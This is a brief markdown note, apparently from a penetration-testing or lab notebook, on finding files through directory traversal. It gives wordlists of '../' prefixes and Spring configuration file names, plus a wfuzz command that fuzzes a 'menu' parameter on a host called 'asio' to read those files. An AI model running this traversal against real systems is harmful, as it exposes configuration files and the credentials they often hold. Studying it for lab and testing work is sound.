---
tags:
- directoryTraversal
---

# Example how to find file in directory traversal

paths.txt
```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```
files.txt

```
application.properties
application.yml
config/application.properties
config/application.yml
```
Fuzzing
```bash
wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
```
